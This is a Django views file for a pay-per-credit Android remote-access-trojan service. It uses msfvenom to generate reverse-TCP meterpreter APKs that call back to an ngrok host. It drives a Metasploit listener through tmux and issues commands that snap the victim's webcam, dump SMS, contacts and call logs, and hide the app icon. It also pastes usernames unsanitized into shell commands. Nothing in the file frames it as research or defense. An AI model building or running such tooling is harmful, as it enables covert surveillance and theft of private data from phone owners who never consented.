from django.shortcuts import render, redirect,get_object_or_404
from RAT import models
from django.http import HttpResponse, HttpResponseRedirect
from django.views import generic
from django.template import loader
import os, errno
from django.contrib.auth import login, authenticate
from django.contrib.auth.mixins import LoginRequiredMixin
from django.urls import reverse_lazy,reverse
from RAT.forms import SignUpForm
import subprocess
import gmplot
from django.http import JsonResponse



###################                  metasploit
def add(request):
    credits = models.Credit.objects.get(user = request.user)
    if credits.number > 0:
        credits.number-=1
        credits.save()
        host='0.tcp.ngrok.io'
        port='12457'
        username = request.user.username
        dircd = '/root/django/users/'+ str(username)
        dir = '/root/django/users/'+ str(username)+'/'+str(username)
        d=os.system('mkdir /root/django/users/'+ str(username))
        c=os.system('cd '+str(dircd)+' ;msfvenom -p android/meterpreter/reverse_tcp lhost='+str(host)+' lport='+str(port)+' -o '+ str(dir)+'.apk')
        if c == 0:
            c = "Your rat created in "+ str(dir)+".apk"
    else:
        c = 'you dont have credit'
    # Render the HTML template index.html with the data in the context variable
    return render(
        request,
        'addrat.html',
        context={'c' : c
        },
    )

def listen(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/'+str(username)
    dirr = '/root/django/users/'+ str(username)+'/'

    commandd = "tmux new-session -s "+str(username)
    os.system('xterm -T "'+str(username)+'" -e '+str(commandd))
    file =os.system('tmux capture-pane -t '+str(username)+' -pS -1000000 > '+str(dirr)+'file.txt""\n"')
    with open(dirr+'file.txt', 'rb') as fh:
        last = fh.readlines()[-1].decode()
    with open('hacked.txt', 'rb') as fh:
        hacked = fh.readlines()[-1].decode()
    if hacked == last :
        color = "green"
    else:
        color = "gray"
    return render(
        request,
        'listen.html',
        context={'last' : last,'hacked' : hacked,'color' : color,
        }
    )
def startlisten(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/'+str(username)

    os.system('tmux send-keys -t '+str(username)+' "msfconsole""\n"')
    os.system('tmux send-keys -t '+str(username)+' "use multi/handler""\n"')
    os.system('tmux send-keys -t '+str(username)+' "set payload android/meterpreter/reverse_tcp""\n"')
    os.system('tmux send-keys -t '+str(username)+' "set lhost 127.0.0.1""\n"')
    os.system('tmux send-keys -t '+str(username)+' "set lport 443""\n"')
    os.system('tmux send-keys -t '+str(username)+' "run""\n"')



    return redirect('RAT:listen')

def webcamsnap(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/'

    os.system('tmux send-keys -t '+str(username)+' "webcam_snap -o '+str(dir)+'""\n"')
    os.system('tmux send-keys -t '+str(username)+' "webcam_snap -o '+str(dir)+'""\n"')

    return redirect('RAT:listen')

def dumpsms(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/dumpsms.txt'

    os.system('tmux send-keys -t '+str(username)+' "dump_sms -o '+str(dir)+'""\n"')

    return redirect('RAT:listen')

def dumpcontacts(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/dumpcontacts.txt'

    os.system('tmux send-keys -t '+str(username)+' "dump_contacts -o '+str(dir)+'""\n"')

    return redirect('RAT:listen')

def dumpcalllog(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/dumpcalllog.txt'

    os.system('tmux send-keys -t '+str(username)+' "dump_calllog -o '+str(dir)+'""\n"')

    return redirect('RAT:listen')

def hideappicon(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/dumpcalllog.txt'

    os.system('tmux send-keys -t '+str(username)+' "hide_app_icon""\n"')

    return redirect('RAT:listen')

def geolocate(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/'
    l1 = "34.0778838"
    l2 = "49.71006839999999"
    # gmap1 = gmplot.GoogleMapPlotter(l1,
    #                             l2, 13 )
    # gmap1.draw( str(dir)+"map.html" )
    return JsonResponse({'latitude':l1,'longitude': l2,})
